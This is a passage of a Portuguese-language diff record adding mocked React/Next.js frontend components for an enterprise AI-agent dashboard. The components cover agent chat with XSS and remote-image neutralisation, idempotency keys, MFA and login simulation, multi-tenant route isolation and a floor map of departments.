# Diffs — LOC-WEB-001 — Fundação navegável do frontend com dados mockados (2026-10-30)

> Documento principal: [2026-10-30-loc-web-001-frontend-mockado.md](2026-10-30-loc-web-001-frontend-mockado.md) · Especificação: [lote-2026-10-30-frontend-mockado-web-001.md](../planejamento-ia/lote-2026-10-30-frontend-mockado-web-001.md)

## Diff consolidado (`f322f4b1698f94ae276fdb8838137cd6b7e9cef8..HEAD` em `apps/web`)

```diff
diff --git a/apps/web/app/components/AgentChatAndSecurityPanel.tsx b/apps/web/app/components/AgentChatAndSecurityPanel.tsx
new file mode 100644
index 0000000..6c4d0ea
--- /dev/null
+++ b/apps/web/app/components/AgentChatAndSecurityPanel.tsx
@@ -0,0 +1,339 @@
+"use client";
+
+import { useState } from "react";
+import { MOCK_AGENT_CONVERSATIONS, type MockChatMessage } from "../../lib/mock-enterprise-data.ts";
+import {
+  registerIdempotentMutation,
+  sanitizeAgentMessageContent,
+} from "../../lib/mock-security.ts";
+
+export function AgentChatAndSecurityPanel() {
+  const [selectedAgentId, setSelectedAgentId] = useState<string>(
+    MOCK_AGENT_CONVERSATIONS[0]?.agentId ?? "agt-fin-01",
+  );
+  const [draftPrompt, setDraftPrompt] = useState<string>("");
+  const [customMessages, setCustomMessages] = useState<readonly MockChatMessage[]>([]);
+  const [idempotencyKeys, setIdempotencyKeys] = useState<readonly string[]>([]);
+  const [lastIdempotencyNotice, setLastIdempotencyNotice] = useState<string | null>(null);
+  const [revealedBlockedUrls, setRevealedBlockedUrls] = useState<readonly string[]>([]);
+
+  const activeConversation =
+    MOCK_AGENT_CONVERSATIONS.find((c) => c.agentId === selectedAgentId) ??
+    MOCK_AGENT_CONVERSATIONS[0];
+
+  const messages: readonly MockChatMessage[] = activeConversation
+    ? [...activeConversation.messages, ...customMessages]
+    : customMessages;
+
+  function handleSendPrompt(promptText: string): void {
+    const trimmed = promptText.trim();
+    if (!trimmed || !activeConversation) {
+      return;
+    }
+
+    const check = registerIdempotentMutation(
+      idempotencyKeys,
+      activeConversation.agentId,
+      trimmed,
+      "send-chat-job",
+    );
+
+    if (!check.allowed) {
+      setLastIdempotencyNotice(
+        `Mutação duplicada bloqueada por Idempotency-Key (${check.idempotencyKey}) — WEB-002.`,
+      );
+      return;
+    }
+
+    setIdempotencyKeys(check.updatedKeys);
+    setLastIdempotencyNotice(`Job criado com Idempotency-Key: ${check.idempotencyKey}`);
+
+    const userMsg: MockChatMessage = {
+      id: `msg-usr-${String(customMessages.length + 100)}`,
+      sender: "user",
+      authorLabel: "Você (Sessão Mockada)",
+      timestampLabel: "agora",
+      rawContent: trimmed,
+      toolSteps: [],
+      citations: [],
+      costTokens: 95,
+    };
+
+    const agentReply: MockChatMessage = {
+      id: `msg-agt-${String(customMessages.length + 101)}`,
+      sender: "agent",
+      authorLabel: activeConversation.agentName,
+      timestampLabel: "agora (stream simulado)",
+      rawContent:
+        `Recebi sua solicitação: "${trimmed}".\n` +
+        "Consultei os índices autorizados do tenant e gerei o parecer preliminar sem executar mutações externas sem aprovação.",
+      toolSteps: [
+        {
+          stepId: `stp-sim-${String(customMessages.length + 1)}`,
+          toolName: "tenant_rag.hybrid_search",
+          policyDecision: "ALLOW",
+          durationMs: 54,
+          summary: "Busca vetorial + textual restrita ao tenant_id ativo",
+        },
+      ],
+      citations: [
+        {
+          documentId: "doc-rag-01",
+          documentTitle: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
+          sectionLabel: "Seção 1.1 — Escopo de operação",
+        },
+      ],
+      costTokens: 610,
+    };
+
+    setCustomMessages((prev) => [...prev, userMsg, agentReply]);
+    setDraftPrompt("");
+  }
+
+  return (
+    <section className="panel-card" aria-labelledby="chat-security-heading">
+      <div className="panel-header">
+        <div>
+          <h2 id="chat-security-heading">
+            Conversas com Agentes, Execução de Ferramentas &amp; Sanitização (WEB-004 + WEB-008)
+          </h2>
+          <p
+            style={{
+              margin: "0.25rem 0 0",
+              fontSize: "0.86rem",
+              color: "var(--text-secondary)",
+            }}
+          >
+            Histórico com passos do Tool Gateway, citações do RAG, chave de idempotência contra
+            duplo clique e neutralização de XSS/imagens remotas.
+          </p>
+        </div>
+
+        <div className="control-group">
+          <label htmlFor="chat-agent-select">Agente em conversa</label>
+          <select
+            id="chat-agent-select"
+            className="control-select"
+            value={selectedAgentId}
+            onChange={(e) => {
+              setSelectedAgentId(e.target.value);
+              setCustomMessages([]);
+              setLastIdempotencyNotice(null);
+            }}
+          >
+            {MOCK_AGENT_CONVERSATIONS.map((conv) => (
+              <option key={conv.agentId} value={conv.agentId}>
+                {conv.agentName} — {conv.departmentName} ({conv.modelName})
+              </option>
+            ))}
+          </select>
+        </div>
+      </div>
+
+      <ul className="item-list" aria-label="Mensagens da conversa com o agente">
+        {messages.map((msg) => {
+          const sanitized = sanitizeAgentMessageContent(msg.rawContent);
+
+          return (
+            <li key={msg.id} className="item-card">
+              <div
+                style={{
+                  display: "flex",
+                  justifyContent: "space-between",
+                  alignItems: "center",
+                  gap: "0.5rem",
+                }}
+              >
+                <div>
+                  <strong>{msg.authorLabel}</strong>{" "}
+                  <span
+                    style={{
+                      fontSize: "0.78rem",
+                      color: "var(--text-secondary)",
+                    }}
+                  >
+                    ({msg.timestampLabel})
+                  </span>
+                </div>
+                <span className="demo-badge demo-badge--info">{msg.costTokens} tokens</span>
+              </div>
+
+              {sanitized.blockedXssCount > 0 ? (
+                <div
+                  role="alert"
+                  className="demo-badge demo-badge--danger"
+                  style={{ alignSelf: "flex-start" }}
+                >
+                  WEB-008: {sanitized.blockedXssCount} payload(s) XSS/script neutralizado(s) antes
+                  da renderização
+                </div>
+              ) : null}
+
+              <div
+                style={{
+                  display: "flex",
+                  flexDirection: "column",
+                  gap: "0.35rem",
+                  marginTop: "0.25rem",
+                }}
+              >
+                {sanitized.safeSegments.map((seg, idx) => {
+                  const segKey = `${msg.id}-seg-${String(idx)}`;
+                  if (seg.kind === "code") {
+                    return (
+                      <code key={segKey} className="code-preview">
+                        {seg.content}
+                      </code>
+                    );
+                  }
+                  if (seg.kind === "blocked_xss") {
+                    return (
+                      <div key={segKey} className="code-preview">
+                        [Trecho bloqueado pelo sanitizador WEB-008: {seg.content}]
+                      </div>
+                    );
+                  }
+                  if (seg.kind === "blocked_remote_image") {
+                    return (
+                      <div
+                        key={segKey}
+                        className="code-preview"
+                        style={{
+                          display: "flex",
+                          flexWrap: "wrap",
+                          justifyContent: "space-between",
+                          alignItems: "center",
+                          gap: "0.5rem",
+                        }}
+                      >
+                        <span>
+                          Imagem remota bloqueada automaticamente (evita exfiltração por query
+                          string).
+                        </span>
+                        <button
+                          type="button"
+                          className="btn btn--secondary"
+                          onClick={() => {
+                            setRevealedBlockedUrls((prev) =>
+                              prev.includes(seg.content) ? prev : [...prev, seg.content],
+                            );
+                          }}
+                        >
+                          Inspecionar URL bloqueada (sem carregar imagem)
+                        </button>
+                        {revealedBlockedUrls.includes(seg.content) ? (
+                          <div style={{ width: "100%", fontSize: "0.75rem" }}>
+                            marcador retido: {seg.content}
+                          </div>
+                        ) : null}
+                      </div>
+                    );
+                  }
+                  return (
+                    <p key={segKey} style={{ margin: 0, fontSize: "0.88rem" }}>
+                      {seg.content}
+                    </p>
+                  );
+                })}
+              </div>
+
+              {msg.toolSteps.length > 0 ? (
+                <div
+                  style={{
+                    marginTop: "0.5rem",
+                    paddingTop: "0.5rem",
+                    borderTop: "1px solid var(--border-subtle)",
+                    fontSize: "0.8rem",
+                  }}
+                >
+                  <strong>Ferramentas acionadas via Tool Gateway:</strong>
+                  <ul style={{ margin: "0.35rem 0 0", paddingLeft: "1.2rem" }}>
+                    {msg.toolSteps.map((step) => (
+                      <li key={step.stepId}>
+                        <code>{step.toolName}</code> — Decisão:{" "}
+                        <strong>{step.policyDecision}</strong> ({step.durationMs}
+                        ms) · {step.summary}
+                      </li>
+                    ))}
+                  </ul>
+                </div>
+              ) : null}
+
+              {msg.citations.length > 0 ? (
+                <div style={{ fontSize: "0.78rem", color: "var(--text-secondary)" }}>
+                  <strong>Citações autorizadas (RAG):</strong>{" "}
+                  {msg.citations.map((cit) => (
+                    <span key={cit.documentId} style={{ marginRight: "0.75rem" }}>
+                      [{cit.documentTitle} — {cit.sectionLabel}]
+                    </span>
+                  ))}
+                </div>
+              ) : null}
+            </li>
+          );
+        })}
+      </ul>
+
+      <div
+        style={{
+          marginTop: "1rem",
+          paddingTop: "1rem",
+          borderTop: "1px solid var(--border-subtle)",
+          display: "flex",
+          flexWrap: "wrap",
+          gap: "0.75rem",
+          alignItems: "flex-end",
+        }}
+      >
+        <div className="control-group" style={{ flex: "1 1 320px" }}>
+          <label htmlFor="agent-chat-input">
+            Enviar instrução ao agente (simula criação de job com Idempotency-Key)
+          </label>
+          <input
+            id="agent-chat-input"
+            type="text"
+            className="control-input"
+            placeholder="Ex.: Verificar divergências fiscais do lote de outubro..."
+            value={draftPrompt}
+            onChange={(e) => {
+              setDraftPrompt(e.target.value);
+            }}
+          />
+        </div>
+
+        <button
+          type="button"
+          className="btn btn--approve"
+          onClick={() => {
+            handleSendPrompt(draftPrompt);
+          }}
+        >
+          Enviar mensagem ao agente
+        </button>
+
+        <button
+          type="button"
+          className="btn btn--secondary"
+          onClick={() => {
+            handleSendPrompt("Teste de repetição idempotente para o lote BR-442");
+          }}
+        >
+          Testar proteção de duplo clique (Idempotência WEB-002)
+        </button>
+      </div>
+
+      {lastIdempotencyNotice ? (
+        <p
+          role="status"
+          style={{
+            marginTop: "0.6rem",
+            fontSize: "0.82rem",
+            color: "var(--status-warn-text)",
+          }}
+        >
+          {lastIdempotencyNotice}
+        </p>
+      ) : null}
+    </section>
+  );
+}
diff --git a/apps/web/app/components/AuthAndMultiOrgPanel.tsx b/apps/web/app/components/AuthAndMultiOrgPanel.tsx
new file mode 100644
index 0000000..dcd2cc9
--- /dev/null
+++ b/apps/web/app/components/AuthAndMultiOrgPanel.tsx
@@ -0,0 +1,262 @@
+"use client";
+
+import { useState } from "react";
+import { MOCK_SESSION_ACTORS, resolveTenantRouteAccess } from "../../lib/mock-enterprise-data.ts";
+
+type AuthStepView = "login" | "mfa" | "forgot_password" | "verify_email" | "org_selector";
+
+export function AuthAndMultiOrgPanel() {
+  const [authStep, setAuthStep] = useState<AuthStepView>("org_selector");
+  const [actorId, setActorId] = useState<string>(MOCK_SESSION_ACTORS[0]?.id ?? "usr-marina-01");
+  const [requestedSlug, setRequestedSlug] = useState<string>("aurora-industrial");
+  const [totpCode, setTotpCode] = useState<string>("482910");
+  const [authNotice, setAuthNotice] = useState<string | null>(null);
+
+  const activeActor =
+    MOCK_SESSION_ACTORS.find((a) => a.id === actorId) ?? MOCK_SESSION_ACTORS[0] ?? null;
+
+  const routeResolution = resolveTenantRouteAccess(activeActor, requestedSlug);
+
+  return (
+    <section className="panel-card" aria-labelledby="auth-multiorg-heading">
+      <div className="panel-header">
+        <div>
+          <h2 id="auth-multiorg-heading">
+            Autenticação, MFA &amp; Isolamento Multi-Organização (WEB-001 + WEB-002)
+          </h2>
+          <p
+            style={{
+              margin: "0.25rem 0 0",
+              fontSize: "0.86rem",
+              color: "var(--text-secondary)",
+            }}
+          >
+            Simulação das rotas <code>/login</code>, <code>/mfa</code>,{" "}
+            <code>/forgot-password</code>, <code>/verify-email</code> e <code>/orgs/[orgSlug]</code>
+            . Nenhum token é gravado em <code>localStorage</code> ou <code>sessionStorage</code>.
+          </p>
+        </div>
+
+        <div className="action-row" style={{ marginTop: 0 }}>
+          <button
+            type="button"
+            className="btn btn--secondary"
+            onClick={() => {
+              setAuthStep("login");
+            }}
+          >
+            /login
+          </button>
+          <button
+            type="button"
+            className="btn btn--secondary"
+            onClick={() => {
+              setAuthStep("mfa");
+            }}
+          >
+            /mfa
+          </button>
+          <button
+            type="button"
+            className="btn btn--secondary"
+            onClick={() => {
+              setAuthStep("forgot_password");
+            }}
+          >
+            /forgot-password
+          </button>
+          <button
+            type="button"
+            className="btn btn--secondary"
+            onClick={() => {
+              setAuthStep("verify_email");
+            }}
+          >
+            /verify-email
+          </button>
+          <button
+            type="button"
+            className="btn btn--approve"
+            onClick={() => {
+              setAuthStep("org_selector");
+            }}
+          >
+            /orgs/[orgSlug] (Teste A/B 404)
+          </button>
+        </div>
+      </div>
+
+      {authStep === "login" ? (
+        <div className="item-card">
+          <h3>Simulação de /login (Credenciais Opacas + Redirecionamento MFA)</h3>
+          <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)" }}>
+            Na arquitetura real (ADR-016), o Control Plane emite cookie{" "}
+            <code>HttpOnly; Secure; SameSite=Lax</code> após o segundo fator.
+          </p>
+          <div className="action-row">
+            <button
+              type="button"
+              className="btn btn--approve"
+              onClick={() => {
+                setAuthNotice(
+                  "Credenciais primárias validadas; avançando para desafio TOTP (/mfa).",
+                );
+                setAuthStep("mfa");
+              }}
+            >
+              Autenticar e avançar para /mfa
+            </button>
+          </div>
+        </div>
+      ) : null}
+
+      {authStep === "mfa" ? (
+        <div className="item-card">
+          <h3>Simulação de /mfa (Segundo Fator TOTP Obrigatório)</h3>
+          <div className="control-group" style={{ maxWidth: "240px" }}>
+            <label htmlFor="mfa-totp-input">Código TOTP de 6 dígitos</label>
+            <input
+              id="mfa-totp-input"
+              type="text"
+              className="control-input"
+              value={totpCode}
+              onChange={(e) => {
+                setTotpCode(e.target.value);
+              }}
+            />
+          </div>
+          <div className="action-row">
+            <button
+              type="button"
+              className="btn btn--approve"
+              onClick={() => {
+                setAuthNotice(
+                  `Desafio MFA (${totpCode}) confirmado. Sessão ativa sem qualquer token em localStorage.`,
+                );
+                setAuthStep("org_selector");
+              }}
+            >
+              Confirmar MFA e abrir /orgs
+            </button>
+          </div>
+        </div>
+      ) : null}
+
+      {authStep === "forgot_password" ? (
+        <div className="item-card">
+          <h3>Simulação de /forgot-password</h3>
+          <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)" }}>
+            Resposta idêntica para e-mails cadastrados ou inexistentes (evita enumeração de contas).
+          </p>
+          <button
+            type="button"
+            className="btn btn--secondary"
+            onClick={() => {
+              setAuthNotice("Se o endereço existir, um link temporário de uso único foi enviado.");
+            }}
+          >
+            Simular disparo de recuperação
+          </button>
+        </div>
+      ) : null}
+
+      {authStep === "verify_email" ? (
+        <div className="item-card">
+          <h3>Simulação de /verify-email</h3>
+          <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)" }}>
+            Confirmação de endereço de e-mail corporativo antes de ativar memberships.
+          </p>
+        </div>
+      ) : null}
+
+      {authStep === "org_selector" ? (
+        <div className="two-col-grid">
+          <div className="item-card">
+            <h3>1. Selecionar Sessão e Rota Solicitada</h3>
+            <div className="control-group">
+              <label htmlFor="session-actor-select">Usuário autenticado na sessão</label>
+              <select
+                id="session-actor-select"
+                className="control-select"
+                value={actorId}
+                onChange={(e) => {
+                  setActorId(e.target.value);
+                }}
+              >
+                {MOCK_SESSION_ACTORS.map((actor) => (
+                  <option key={actor.id} value={actor.id}>
+                    {actor.displayName} (Orgs: {actor.authorizedOrgSlugs.join(", ")})
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            <div className="control-group" style={{ marginTop: "0.6rem" }}>
+              <label htmlFor="target-org-slug-select">
+                Rota solicitada: <code>/orgs/[orgSlug]</code>
+              </label>
+              <select
+                id="target-org-slug-select"
+                className="control-select"
+                value={requestedSlug}
+                onChange={(e) => {
+                  setRequestedSlug(e.target.value);
+                }}
+              >
+                <option value="aurora-industrial">/orgs/aurora-industrial (Tenant A)</option>
+                <option value="vereda-logistica">/orgs/vereda-logistica (Tenant B)</option>
+                <option value="titan-defesa">
+                  /orgs/titan-defesa (Tenant C — Não pertence à sessão → 404)
+                </option>
+              </select>
+            </div>
+          </div>
+
+          <div className="item-card">
+            <h3>2. Resultado da Guarda de Isolamento A/B (WEB-001 AC-2)</h3>
+            <div className="org-meta-row">
+              <span
+                className={
+                  routeResolution.allowed
+                    ? "demo-badge demo-badge--ok"
+                    : "demo-badge demo-badge--danger"
+                }
+              >
+                HTTP {routeResolution.httpStatus}
+              </span>
+              <code>/orgs/{requestedSlug}</code>
+            </div>
+
+            <p style={{ margin: "0.4rem 0", fontSize: "0.86rem" }}>{routeResolution.safeMessage}</p>
+
+            {routeResolution.organization ? (
+              <div className="code-preview">
+                Organização resolvida: <strong>{routeResolution.organization.displayName}</strong> (
+                {routeResolution.organization.legalName}) · Estado:{" "}
+                {routeResolution.organization.tenantState}
+              </div>
+            ) : (
+              <div className="code-preview">
+                Nenhum dado de <code>{requestedSlug}</code> foi retornado ao cliente (404 seguro
+                contra enumeração entre tenants).
+              </div>
+            )}
+          </div>
+        </div>
+      ) : null}
+
+      {authNotice ? (
+        <p
+          role="status"
+          style={{
+            marginTop: "0.75rem",
+            fontSize: "0.82rem",
+            color: "var(--status-ok-text)",
+          }}
+        >
+          {authNotice}
+        </p>
+      ) : null}
+    </section>
+  );
+}
diff --git a/apps/web/app/components/BuildingFloorMap.tsx b/apps/web/app/components/BuildingFloorMap.tsx
new file mode 100644
index 0000000..f3261a2
--- /dev/null
+++ b/apps/web/app/components/BuildingFloorMap.tsx
@@ -0,0 +1,287 @@
+"use client";
+
+import type {
+  AgentStatus,
+  BudgetAlertLevel,
+  FloorPresentation,
+  MockAgent,
+} from "../../lib/mock-types.ts";
+
+export interface BuildingFloorMapProps {
+  readonly floors: readonly FloorPresentation[];
+  readonly selectedFloor: FloorPresentation | null;
+  readonly filteredAgents: readonly MockAgent[];
+  readonly isProvisioning: boolean;
+  readonly agentQuery: string;
+  readonly onSelectFloor: (floorId: string) => void;
+  readonly onChangeAgentQuery: (query: string) => void;
+}
+
+function getAgentStatusLabel(status: AgentStatus): {
+  readonly label: string;
+  readonly badgeClass: string;
+} {
+  switch (status) {
+    case "executing":
+      return { label: "Em execução", badgeClass: "demo-badge demo-badge--ok" };
+    case "awaiting_approval":
+      return {
+        label: "Aguarda aprovação",
+        badgeClass: "demo-badge demo-badge--warn",
+      };
+    case "degraded":
+      return {
+        label: "Pausado / Cota",
+        badgeClass: "demo-badge demo-badge--danger",
+      };
+    case "idle":
+      return { label: "Ocioso", badgeClass: "demo-badge demo-badge--info" };
+  }
+}
+
+function getBudgetBadgeClass(level: BudgetAlertLevel): string {
+  switch (level) {
+    case "critical_100":
+      return "demo-badge demo-badge--danger";
+    case "warning_80":
+      return "demo-badge demo-badge--warn";
+    case "healthy":
+      return "demo-badge demo-badge--ok";
+  }
+}
+
+function getProgressFillClass(level: BudgetAlertLevel): string {
+  switch (level) {
+    case "critical_100":
+      return "progress-fill progress-fill--danger";
+    case "warning_80":
+      return "progress-fill progress-fill--warn";
+    case "healthy":
+      return "progress-fill";
+  }
+}
+
+export function BuildingFloorMap({
+  floors,
+  selectedFloor,
+  filteredAgents,
+  isProvisioning,
+  agentQuery,
+  onSelectFloor,
+  onChangeAgentQuery,
+}: BuildingFloorMapProps) {
+  return (
+    <section className="panel-card" aria-labelledby="building-section-heading">
+      <div className="panel-header">
+        <div>
+          <h2 id="building-section-heading">
+            Edifício Virtual &amp; Departamentos Contratados (Modo 2D Acessível)
+          </h2>
+          <p style={{ margin: "0.25rem 0 0", color: "var(--text-secondary)", fontSize: "0.88rem" }}>
+            Cada andar representa um módulo contratado pela organização. Selecione um andar pelo
+            teclado ou clique para inspecionar suas estações de agentes.
+          </p>
+        </div>
+        {isProvisioning ? (
+          <span className="demo-badge demo-badge--warn">Edifício em construção (PROVISIONING)</span>
+        ) : (
+          <span className="demo-badge demo-badge--ok">
+            Planta sincronizada ({floors.length} andares)
+          </span>
+        )}
+      </div>
+
+      <div className="building-layout">
+        <div
+          className="building-stack"
+          role="group"
+          aria-label="Corte vertical de andares do edifício da organização"
+        >
+          <div className="building-roof">Topo do Edifício · Gateway &amp; Isolamento do Tenant</div>
+
+          {floors.map((floor) => {
+            const isSelected = selectedFloor?.id === floor.id;
+            return (
+              <button
+                key={floor.id}
+                type="button"
+                className="floor-button"
+                aria-pressed={isSelected}
+                aria-label={`Andar ${floor.floorNumber}: ${floor.name}, ${floor.agents.length} agentes, orçamento em ${floor.budgetStatus.percentage}%`}
+                onClick={() => {
+                  onSelectFloor(floor.id);
+                }}
+              >
+                <div className="floor-button__top">
+                  <strong>
+                    {floor.floorNumber}º Andar · {floor.name}
+                  </strong>
+                  <span className={getBudgetBadgeClass(floor.budgetStatus.alertLevel)}>
+                    {floor.budgetStatus.percentage}% cota
+                  </span>
+                </div>
+
+                <div style={{ fontSize: "0.78rem", color: "var(--text-secondary)" }}>
+                  Módulo <code>{floor.moduleCode}</code> · {floor.agents.length}{" "}
+                  {floor.agents.length === 1 ? "agente" : "agentes"} ({floor.executingAgentsCount}{" "}
+                  em execução)
+                </div>
+
+                <div className="floor-windows" aria-hidden="true">
+                  {floor.agents.map((agent) => (
+                    <span key={agent.id} className="window-pill">
+                      [{agent.workstationCode}] {agent.name}
+                    </span>
+                  ))}
+                </div>
+              </button>
+            );
+          })}
+        </div>
+
+        <div className="panel-card" style={{ background: "var(--bg-elevated)" }}>
+          {selectedFloor ? (
+            <>
+              <div className="panel-header">
+                <div>
+                  <h3 id="selected-floor-heading">
+                    {selectedFloor.floorNumber}º Andar — {selectedFloor.name}
+                  </h3>
+                  <p
+                    style={{
+                      margin: "0.25rem 0 0",
+                      fontSize: "0.86rem",
+                      color: "var(--text-secondary)",
+                    }}
+                  >
+                    {selectedFloor.summary}
+                  </p>
+                </div>
+                <span className={getBudgetBadgeClass(selectedFloor.budgetStatus.alertLevel)}>
+                  {selectedFloor.budgetStatus.alertLabel}
+                </span>
+              </div>
+
+              <div
+                style={{
+                  display: "grid",
+                  gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))",
+                  gap: "0.85rem",
+                  marginBottom: "1rem",
+                }}
+              >
+                <div>
+                  <div
+                    style={{
+                      display: "flex",
+                      justifyContent: "space-between",
+                      fontSize: "0.8rem",
+                      marginBottom: "0.25rem",
+                    }}
+                  >
+                    <span>Orçamento mensal do andar</span>
+                    <strong>
+                      R$ {selectedFloor.monthlySpentBrl} / R$ {selectedFloor.monthlyBudgetBrl} (
+                      {selectedFloor.budgetStatus.percentage}%)
+                    </strong>
+                  </div>
+                  <div className="progress-track" aria-hidden="true">
+                    <div
+                      className={getProgressFillClass(selectedFloor.budgetStatus.alertLevel)}
+                      style={{
+                        width: `${Math.min(100, selectedFloor.budgetStatus.percentage)}%`,
+                      }}
+                    />
+                  </div>
+                </div>
+
+                <div className="control-group">
+                  <label htmlFor="floor-agent-filter">Filtrar agentes neste andar</label>
+                  <input
+                    id="floor-agent-filter"
+                    type="search"
+                    className="control-input"
+                    placeholder="Nome, código ou tarefa..."
+                    value={agentQuery}
+                    onChange={(e) => {
+                      onChangeAgentQuery(e.target.value);
+                    }}
+                  />
+                </div>
+              </div>
+
+              {filteredAgents.length === 0 ? (
+                <p style={{ color: "var(--text-secondary)", fontSize: "0.9rem" }}>
+                  Nenhum agente corresponde ao filtro informado neste andar.
+                </p>
+              ) : (
+                <div
+                  className="agent-grid"
+                  role="list"
+                  aria-label={`Estações de trabalho do ${selectedFloor.floorNumber}º andar`}
+                >
+                  {filteredAgents.map((agent) => {
+                    const statusMeta = getAgentStatusLabel(agent.status);
+                    const tokenPct =
+                      agent.tokensLimitMonth === 0
+                        ? 0
+                        : Math.round((agent.tokensUsedMonth / agent.tokensLimitMonth) * 100);
+                    return (
+                      <article key={agent.id} role="listitem" className="agent-card">
+                        <div
+                          style={{
+                            display: "flex",
+                            justifyContent: "space-between",
+                            alignItems: "flex-start",
+                            gap: "0.5rem",
+                          }}
+                        >
+                          <div>
+                            <strong>{agent.name}</strong>
+                            <div
+                              style={{
+                                fontSize: "0.78rem",
+                                color: "var(--text-secondary)",
+                              }}
+                            >
+                              {agent.roleTitle} · Sala <code>{agent.workstationCode}</code>
+                            </div>
+                          </div>
+                          <span className={statusMeta.badgeClass}>{statusMeta.label}</span>
+                        </div>
+
+                        <p
+                          style={{
+                            margin: "0.25rem 0",
+                            fontSize: "0.84rem",
+                            color: "var(--text-primary)",
+                          }}
+                        >
+                          {agent.currentTaskSummary}
+                        </p>
+
+                        <div
+                          style={{
+                            fontSize: "0.76rem",
+                            color: "var(--text-muted)",
+                            display: "flex",
+                            justifyContent: "space-between",
+                          }}
+                        >
+                          <span>Modelo: {agent.modelName}</span>
+                          <span>Tokens: {tokenPct}% da cota</span>
+                        </div>
+                      </article>
+                    );
+                  })}
+                </div>
+              )}
+            </>
+          ) : (
+            <p>Selecione um andar para visualizar os agentes.</p>
+          )}
+        </div>
+      </div>
+    </section>
+  );
+}
diff --git a/apps/web/app/components/DashboardClientShell.tsx b/apps/web/app/components/DashboardClientShell.tsx
new file mode 100644
index 0000000..8c3ccb7
--- /dev/null
+++ b/apps/web/app/components/DashboardClientShell.tsx
@@ -0,0 +1,448 @@
+"use client";
+
+import { useState } from "react";
+import { deriveDashboardViewModel, listMockOrganizations } from "../../lib/mock-selectors.ts";
+import type { DemoStateVariant } from "../../lib/mock-types.ts";
+import { AgentChatAndSecurityPanel } from "./AgentChatAndSecurityPanel.tsx";
+import { AuthAndMultiOrgPanel } from "./AuthAndMultiOrgPanel.tsx";
+import { BuildingFloorMap } from "./BuildingFloorMap.tsx";
+import { OperationsPanels, type SimulatedApprovalDecision } from "./OperationsPanels.tsx";
+import { OrganizationGovernancePanel } from "./OrganizationGovernancePanel.tsx";
+import { PlatformBackofficePanel } from "./PlatformBackofficePanel.tsx";
+
+export type NavigationSection =
+  "overview" | "building" | "operations" | "chat" | "governance" | "auth" | "platform";
+
+export interface DashboardClientShellProps {
+  readonly initialSection?: NavigationSection;
+}
+
+export function DashboardClientShell({ initialSection = "overview" }: DashboardClientShellProps) {
+  const organizations = listMockOrganizations();
+  const defaultOrgSlug = organizations[0]?.slug ?? "aurora-industrial";
+
+  const [orgSlug, setOrgSlug] = useState<string>(defaultOrgSlug);
+  const [variant, setVariant] = useState<DemoStateVariant>("ready");
+  const [selectedFloorId, setSelectedFloorId] = useState<string | undefined>(undefined);
+  const [agentQuery, setAgentQuery] = useState<string>("");
+  const [activeSection, setActiveSection] = useState<NavigationSection>(initialSection);
+  const [decisions, setDecisions] = useState<readonly SimulatedApprovalDecision[]>([]);
+
+  const viewModel = deriveDashboardViewModel({
+    orgSlug,
+    variant,
+    ...(selectedFloorId !== undefined ? { selectedFloorId } : {}),
+    ...(agentQuery ? { agentQuery } : {}),
+  });
+
+  function handleSelectOrg(nextSlug: string): void {
+    setOrgSlug(nextSlug);
+    setSelectedFloorId(undefined);
+    setAgentQuery("");
+    setDecisions([]);
+  }
+
+  function handleDecideApproval(approvalId: string, decision: "approved" | "rejected"): void {
+    setDecisions((prev) => [
+      ...prev.filter((item) => item.approvalId !== approvalId),
+      { approvalId, decision },
+    ]);
+  }
+
+  return (
+    <div>
+      <a href="#main-content" className="skip-link">
+        Pular para o conteúdo principal
+      </a>
+
+      <aside
+        className="demo-banner"
+        aria-label="Aviso de ambiente de demonstração com dados mockados"
+      >
+        <div>
+          <strong>MODO DEMONSTRAÇÃO (MOCK LOCAL)</strong> — {viewModel.demoBannerText}
+        </div>
+        <span className="demo-badge demo-badge--warn">
+          Sem rede · Sem autenticação real · EP-10 Mockado
+        </span>
+      </aside>
+
+      <header className="shell-header">
+        <div className="shell-header__inner">
+          <div className="brand-block">
+            <span className="brand-title">NÚCLEOS ENTERPRISE</span>
+            <span className="brand-subtitle">
+              Interface Web Completa com Dados Mockados (WEB-001..004, WEB-008, WEB-009)
+            </span>
+          </div>
+
+          <div className="controls-bar">
+            <div className="control-group">
+              <label htmlFor="org-switcher-select">Organização ativa (mock)</label>
+              <select
+                id="org-switcher-select"
+                className="control-select"
+                value={viewModel.organization.slug}
+                onChange={(e) => {
+                  handleSelectOrg(e.target.value);
+                }}
+              >
+                {organizations.map((org) => (
+                  <option key={org.id} value={org.slug}>
+                    {org.displayName} ({org.tenantState} · {org.activeRole})
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            <div className="control-group">
+              <label htmlFor="state-variant-select">Estado determinístico da tela</label>
+              <select
+                id="state-variant-select"
+                className="control-select"
+                value={variant}
+                onChange={(e) => {
+                  setVariant(e.target.value as DemoStateVariant);
+                }}
+              >
+                <option value="ready">Normal (Dados carregados)</option>
+                <option value="loading">Carregando (Skeleton)</option>
+                <option value="empty">Vazio (Sem módulos ativos)</option>
+                <option value="error">Erro (Problem Details)</option>
+              </select>
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <nav className="shell-nav" aria-label="Navegação principal da organização">
+        <ul className="shell-nav__list">
+          <li>
+            <button
+              type="button"
+              className="nav-button"
+              aria-current={activeSection === "overview" ? "page" : undefined}
+              onClick={() => {
+                setActiveSection("overview");
+              }}
+            >
+              Visão Completa
+            </button>
+          </li>
+          <li>
+            <button
+              type="button"
+              className="nav-button"
+              aria-current={activeSection === "building" ? "page" : undefined}
+              onClick={() => {
+                setActiveSection("building");
+              }}
+            >
+              Departamentos &amp; Agentes
+            </button>
+          </li>
+          <li>
+            <button
+              type="button"
+              className="nav-button"
+              aria-current={activeSection === "operations" ? "page" : undefined}
+              onClick={() => {
+                setActiveSection("operations");
+              }}
+            >
+              Aprovações, Filas &amp; Orçamento
+            </button>
+          </li>
+          <li>
+            <button
+              type="button"
+              className="nav-button"
+              aria-current={activeSection === "chat" ? "page" : undefined}
+              onClick={() => {
+                setActiveSection("chat");
+              }}
+            >
+              Chat Agentes &amp; XSS (WEB-004/008)
+            </button>
+          </li>
+          <li>
+            <button
+              type="button"
+              className="nav-button"
+              aria-current={activeSection === "governance" ? "page" : undefined}
+              onClick={() => {
+                setActiveSection("governance");
+              }}
+            >
+              Governança &amp; CSV (WEB-003)
+            </button>
